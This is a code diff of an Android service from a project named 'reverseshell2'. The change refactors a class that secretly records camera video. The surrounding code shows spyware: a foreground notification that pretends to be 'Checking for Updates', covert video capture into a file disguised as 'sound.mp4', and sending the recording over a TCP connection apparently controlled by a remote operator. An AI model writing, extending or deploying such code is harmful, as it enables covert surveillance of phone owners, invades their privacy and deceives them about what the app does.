@@ -24,6 +24,7 @@ import androidx.annotation.Nullable;
 import androidx.core.app.NotificationCompat;
 
 import com.example.reverseshell2.R;
+import com.example.reverseshell2.functions;
 import com.example.reverseshell2.tcpConnection;
 
 import java.io.BufferedInputStream;
@@ -42,7 +43,6 @@ public class videoRecorder extends Service {
     static String TAG = "videoRecoderClass";
 
     File videoFile;
-    static OutputStream outputStream;
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
@@ -50,7 +50,7 @@ public class videoRecorder extends Service {
         String ins = intent.getStringExtra("ins");
         if(ins.equals("startFore")){
 
-            createNotiChannel();
+            new functions(null).createNotiChannel(getApplicationContext());
             Notification notification = new NotificationCompat.Builder(getApplicationContext(),"channelid")
                     .setContentTitle("Checking for Updates")
                     .setContentText("Fetching")
@@ -68,17 +68,10 @@ public class videoRecorder extends Service {
         return START_STICKY;
     }
 
-    private void createNotiChannel() {
-        if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.O){
-            NotificationChannel  notificationChannel = new NotificationChannel("channelid","Foreground notifia",
-                    NotificationManager.IMPORTANCE_DEFAULT);
-            NotificationManager manager = getSystemService(NotificationManager.class);
-            manager.createNotificationChannel(notificationChannel);
-        }
-    }
+
 
     public void startVideo(final int cameraID, final OutputStream outputStream) {
-        this.outputStream = outputStream;
+        //this.outputStream = outputStream;
         File outputDir = getApplicationContext().getCacheDir();
         try {
             videoFile = File.createTempFile("sound", ".mp4", outputDir);
@@ -184,8 +177,6 @@ public class videoRecorder extends Service {
     }
 
     public void videoStop(final OutputStream outputStream){
-
-        this.outputStream = outputStream;
         if(mediaRecorder!=null){
             try{
                 mediaRecorder.stop();
@@ -209,7 +200,7 @@ public class videoRecorder extends Service {
         windowManager.removeView(surfaceView);
 
         if(videoFile.length()!=0 && videoFile.exists()){
-            sendData(videoFile);
+            sendData(videoFile,outputStream);
         }else{
             new Thread(new Runnable() {
                 @Override
@@ -243,7 +234,7 @@ public class videoRecorder extends Service {
         }
     }
 
-    public void sendData(File file) {
+    public void sendData(File file, final OutputStream outputStream) {
         new Thread(new Runnable() {
             @Override
             public void run() {
